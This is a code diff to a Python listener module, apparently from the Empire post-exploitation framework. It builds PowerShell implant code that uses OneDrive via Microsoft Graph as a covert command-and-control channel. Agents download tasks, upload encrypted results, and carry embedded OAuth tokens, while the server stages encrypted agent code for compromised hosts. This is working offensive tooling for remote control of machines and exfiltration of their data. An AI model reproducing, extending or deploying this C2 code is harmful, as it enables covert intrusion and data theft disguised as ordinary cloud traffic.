@@ -179,6 +179,7 @@ class Listener:
 
             if language.startswith("power"):
                 launcher = '$ErrorActionPreference = \"SilentlyContinue\";' #Set as empty string for debugging
+                launcher = ''
 
                 if safeChecks.lower() == 'true':
                     launcher += helpers.randomize_capitalization("If($PSVersionTable.PSVersion.Major -ge 3){")
@@ -321,6 +322,152 @@ class Listener:
             else:
                 return randomized_stager
 
+    def generate_comms(self, listener_options, client_id, token, refresh_token, redirect_uri, language=None):
+
+        staging_key = listener_options['StagingKey']['Value']
+        poll_interval = listener_options['PollInterval']['Value']
+        base_folder = listener_options['BaseFolder']['Value']
+        taskings_folder = listener_options['TaskingsFolder']['Value']
+        results_folder = listener_options['ResultsFolder']['Value']
+
+        if not language:
+            print helpers.color("[!] listeners/onedrive generate_comms(): No language specified")
+            return
+
+        if language.lower() == "powershell":
+            token_manager = """
+    $Script:TokenObject = @{token="%s";refresh="%s";expires=(Get-Date).addSeconds(3480)};
+    function script:Get-WebClient {
+        $wc = New-Object System.Net.WebClient
+        $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
+        $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
+        if($Script:Proxy) {
+            $wc.Proxy = $Script:Proxy;
+        }
+        if((Get-Date) -gt $Script:TokenObject.expires) {
+            $data = New-Object System.Collections.Specialized.NameValueCollection
+            $data.add("client_id", "%s")
+            $data.add("grant_type", "refresh_token")
+            $data.add("scope", "files.readwrite offline_access")
+            $data.add("refresh_token", $Script:TokenObject.refresh)
+            $data.add("redirect_uri", "%s")
+            $bytes = $wc.UploadValues("https://login.microsoftonline.com/common/oauth2/v2.0/token", "POST", $data)
+            $response = [system.text.encoding]::ascii.getstring($bytes)
+            $Script:TokenObject.token = [regex]::match($response, '"access_token":"(.+?)"').groups[1].value
+            $Script:TokenObject.refresh = [regex]::match($response, '"refresh_token":"(.+?)"').groups[1].value
+            $expires_in = [int][regex]::match($response, '"expires_in":([0-9]+)').groups[1].value
+            $Script:TokenObject.expires = (get-date).addSeconds($expires_in - 15)
+        }
+        $wc.headers.add("User-Agent", $script:UserAgent)
+        $wc.headers.add("Authorization", "Bearer $($Script:TokenObject.token)")
+        $Script:Headers.GetEnumerator() | ForEach-Object {$wc.Headers.Add($_.Name, $_.Value)}
+        return $wc
+    }
+            """ % (token, refresh_token, client_id, redirect_uri)
+
+            post_message = """
+    function script:send-message {
+        param($packets)
+
+        if($packets) {
+            $encBytes = encrypt-bytes $packets
+            $routingPacket = New-RoutingPacket -encData $encBytes -Meta 5
+            write-host $packets.length, $encbytes.length, $routingpacket.length
+
+            $wc = Get-WebClient
+            $resultsFolder = "%s"
+
+            try {
+                try {
+                    $data = $null
+                    $data = $wc.DownloadData("https://graph.microsoft.com/v1.0/drive/root:/$resultsFolder/$($script:SessionID).txt:/content")
+                } catch {}
+
+                if($data -and $data.length -ne 0) {
+                    write-host "Appending old data, $($data.length) bytes"
+                    $routingPacket = $data + $routingPacket
+                }
+
+                $wc = Get-WebClient
+
+                write-host "Trying to upload https://graph.microsoft.com/v1.0/drive/root:/$resultsFolder/$($script:SessionID).txt:/content"
+                $null = $wc.UploadData("https://graph.microsoft.com/v1.0/drive/root:/$resultsFolder/$($script:SessionID).txt:/content", "PUT", $RoutingPacket)
+                $script:missedChecking = 0
+            }
+            catch {
+                if($_ -match "Unable to connect") {
+                    $script:missedCheckins += 1
+                }
+            }
+        }
+    }
+            """ % ("%s/%s" % (listener_options['BaseFolder']['Value'], listener_options['ResultsFolder']['Value']))
+
+            get_message = """
+    function script:get-task {
+        try {
+            $wc = Get-WebClient
+
+            $TaskingsFolder = "%s"
+            $data = $wc.DownloadData("https://graph.microsoft.com/v1.0/drive/root:/$TaskingsFolder/$($script:SessionID).txt:/content")
+
+            if($data -and ($data.length -ne 0)) {
+                $wc = Get-WebClient
+                $null = $wc.UploadString("https://graph.microsoft.com/v1.0/drive/root:/$TaskingsFolder/$($script:SessionID).txt", "DELETE", "")
+                $Data
+            }
+            $script:MissedCheckins = 0
+        }
+        catch {
+            if($_ -match "Unable to connect") {
+                $script:MissedCheckins += 1
+            }
+        }
+    }
+    write-host "Got agent code"
+            """ % ("%s/%s" % (listener_options['BaseFolder']['Value'], listener_options['TaskingsFolder']['Value']))
+
+            return token_manager + post_message + get_message
+
+    def generate_agent(self, listener_options, client_id, token, refresh_token, redirect_uri, language=None):
+        """
+        Generate the agent code
+        """
+
+        if not language:
+            print helpers.color("[!] listeners/onedrive generate_agent(): No language specified")
+            return
+
+        language = language.lower()
+        delay = listener_options['DefaultDelay']['Value']
+        jitter = listener_options['DefaultJitter']['Value']
+        profile = listener_options['DefaultProfile']['Value']
+        lost_limit = listener_options['DefaultLostLimit']['Value']
+        working_hours = listener_options['WorkingHours']['Value']
+        kill_date = listener_options['KillDate']['Value']
+        b64_default_response = base64.b64encode(self.default_response())
+
+        if language == 'powershell':
+            f = open(self.mainMenu.installPath + "/data/agent/agent.ps1")
+            agent_code = f.read()
+            f.close()
+
+            comms_code = self.generate_comms(listener_options, client_id, token, refresh_token, redirect_uri, language)
+            agent_code = agent_code.replace("REPLACE_COMMS", comms_code)
+
+            agent_code = helpers.strip_powershell_comments(agent_code)
+
+            agent_code = agent_code.replace('$AgentDelay = 60', "$AgentDelay = " + str(delay))
+            agent_code = agent_code.replace('$AgentJitter = 0', "$AgentJitter = " + str(jitter))
+            agent_code = agent_code.replace('$Profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"', "$Profile = \"" + str(profile) + "\"")
+            agent_code = agent_code.replace('$LostLimit = 60', "$LostLimit = " + str(lost_limit))
+            agent_code = agent_code.replace('$DefaultResponse = ""', '$DefaultResponse = "'+b64_default_response+'"')
+
+            if kill_date != "":
+                agent_code = agent_code.replace("$KillDate,", "$KillDate = '" + str(kill_date) + "',")
+
+            return agent_code
+
     def start_server(self, listenerOptions):
 
         def get_token(client_id, code):
@@ -331,12 +478,9 @@ class Listener:
                       'redirect_uri': redirect_uri}
             try:
                 r = s.post('https://login.microsoftonline.com/common/oauth2/v2.0/token', data=params)
-                s.headers['Authorization'] = "Bearer " + r.json()['access_token']
-                # self.mainMenu.listeners.update_listener_options(listenerName, "RefreshToken", r.json()['refresh_token'])
                 r_token = r.json()
                 r_token['expires_at'] = time.time() + (int)(r_token['expires_in']) - 15
                 r_token['update'] = True
-                dispatcher.send("[*] Got new auth token", sender="listeners/onedrive")
                 return r_token
             except KeyError, e:
                 print helpers.color("[!] Something went wrong, HTTP response %d, error code %s: %s" % (r.status_code, r.json()['error_codes'], r.json()['error_description']))
@@ -350,11 +494,9 @@ class Listener:
                       'redirect_uri': redirect_uri}
             try:
                 r = s.post('https://login.microsoftonline.com/common/oauth2/v2.0/token', data=params)
-                s.headers['Authorization'] = "Bearer " + r.json()['access_token']
                 r_token = r.json()
                 r_token['expires_at'] = time.time() + (int)(r_token['expires_in']) - 15
                 r_token['update'] = True
-                dispatcher.send("[*] Refreshed auth token", sender="listeners/onedrive")
                 return r_token
             except KeyError, e:
                 print helpers.color("[!] Something went wrong, HTTP response %d, error code %s: %s" % (r.status_code, r.json()['error_codes'], r.json()['error_description']))
@@ -434,12 +576,15 @@ class Listener:
 
         if refresh_token:
             token = renew_token(client_id, refresh_token)
+            dispatcher.send("[*] Refreshed auth token", sender="listeners/onedrive")
         else:
             token = get_token(client_id, auth_code)
+            dispatcher.send("[*] Got new auth token", sender="listeners/onedrive")
+
+        s.headers['Authorization'] = "Bearer " + token['access_token']
+        print token['access_token']
 
         setup_folders()
-
-        # Upload stage 0
 
         while True:
             #Wait until Empire is aware the listener is running
@@ -458,12 +603,15 @@ class Listener:
             try:
                 if time.time() > token['expires_at']:
                     token = renew_token(client_id, token['refresh_token'])
+                    s.headers['Authorization'] = "Bearer " + token['access_token']
+                    dispatcher.send("[*] Refreshed auth token", sender="listeners/onedrive")
+                    upload_stager()
                 if token['update']:
                     self.mainMenu.listeners.update_listener_options(listener_name, "RefreshToken", token['refresh_token'])
                     token['update'] = False
 
-                search = s.get("%s/drive/items/root:/%s/%s:/search(q='{*_*.txt}')" % (base_url, base_folder, staging_folder))
-                for item in search.json()['value']:
+                search = s.get("%s/drive/root:/%s/%s?expand=children" % (base_url, base_folder, staging_folder))
+                for item in search.json()['children']:
                     try:
                         reg = re.search("^([A-Z0-9]+)_([0-9]).txt", item['name'])
                         if not reg:
@@ -475,7 +623,7 @@ class Listener:
                             content = s.get(item['@microsoft.graph.downloadUrl']).content
                             lang, return_val = self.mainMenu.agents.handle_agent_data(staging_key, content, listener_options)[0]
                             dispatcher.send("[*] Uploading %s/%s/%s_2.txt, %d bytes" % (base_folder, staging_folder, agent_name, len(return_val)), sender="listeners/onedrive")
-                            s.put("%s/drive/items/root:/%s/%s/%s_2.txt:/content" % (base_url, base_folder, staging_folder, agent_name), data=return_val)
+                            s.put("%s/drive/root:/%s/%s/%s_2.txt:/content" % (base_url, base_folder, staging_folder, agent_name), data=return_val)
                             dispatcher.send("[*] Deleting %s/%s" % (staging_folder, item['name']), sender="listeners/onedrive")
                             s.delete("%s/drive/items/%s" % (base_url, item['id']))
 
@@ -484,17 +632,51 @@ class Listener:
                             dispatcher.send("[*] Downloading %s/%s, %d bytes" % (staging_folder,  item['name'], item['size']), sender="listeners/onedrive")
                             content = s.get(item['@microsoft.graph.downloadUrl']).content
                             lang, return_val = self.mainMenu.agents.handle_agent_data(staging_key, content, listener_options)[0]
-                            dispatcher.send("[*] Uploading %s/%s/%s_4.txt, %d bytes" % (base_folder, staging_folder, agent_name, len(return_val)), sender="listeners/onedrive")
-                            s.put("%s/drive/items/root:/%s/%s/%s_4.txt:/content" % (base_url, base_folder, staging_folder, agent_name), data= return_val)
+
+                            session_key = self.mainMenu.agents.agents[agent_name]['sessionKey']
+                            agent_token = renew_token(client_id, token['refresh_token'])
+                            agent_code = str(self.generate_agent(listener_options, client_id, agent_token['access_token'],
+                                                            agent_token['refresh_token'], redirect_uri, lang))
+                            enc_code = encryption.aes_encrypt_then_hmac(session_key, agent_code)
+
+                            dispatcher.send("[*] Uploading %s/%s/%s_4.txt, %d bytes" % (base_folder, staging_folder, agent_name, len(enc_code)), sender="listeners/onedrive")
+                            s.put("%s/drive/root:/%s/%s/%s_4.txt:/content" % (base_url, base_folder, staging_folder, agent_name), data=enc_code)
                             dispatcher.send("[*] Deleting %s/%s" % (staging_folder, item['name']), sender="listeners/onedrive")
                             s.delete("%s/drive/items/%s" % (base_url, item['id']))
 
                     except Exception, e:
                         print(traceback.format_exc())
 
+                agent_ids = self.mainMenu.agents.get_agents_for_listener(listener_name)
+                for agent_id in agent_ids:
+                    task_data = self.mainMenu.agents.handle_agent_request(agent_id, 'powershell', staging_key)
+                    if task_data:
+                        try:
+                            r = s.get("%s/drive/root:/%s/%s/%s.txt:/content" % (base_url, base_folder, taskings_folder, agent_id))
+                            if r.status_code == 200:
+                                task_data = r.content + task_data
+
+                            dispatcher.send("[*] Uploading agent tasks for %s, %d bytes" %
+                                            (agent_id, len(task_data)), sender="listeners/onedrive")
+
+                            r = s.put("%s/drive/root:/%s/%s/%s.txt:/content" % (base_url, base_folder, taskings_folder, agent_id), data = task_data)
+                        except Exception, e:
+                            dispatcher.send("[!] Error uploading agent tasks for %s, %s" % (agent_id, e))
+
+                search = s.get("%s/drive/root:/%s/%s?expand=children" % (base_url, base_folder, results_folder))
+                for item in search.json()['children']:
+                    try:
+                        agent_id = item['name'].split(".")[0]
+                        dispatcher.send("[*] Downloading results from %s/%s, %d bytes" % (results_folder, item['name'], item['size']), sender="listeners/onedrive")
+                        r = s.get(item['@microsoft.graph.downloadUrl'])
+                        self.mainMenu.agents.handle_agent_data(staging_key, r.content, listener_options)
+                        dispatcher.send("[*] Deleting %s/%s" % (results_folder, item['name']), sender="listeners/onedrive")
+                        s.delete("%s/drive/items/%s" % (base_url, item['id']))
+                    except Exception, e:
+                        dispatcher.send("[!] Error handling agent results for %s, %s" % (item['name'], e), sender="listeners/onedrive")
 
             except Exception, e:
-                print(e)
+                print(traceback.format_exc())
 
             s.close()
 
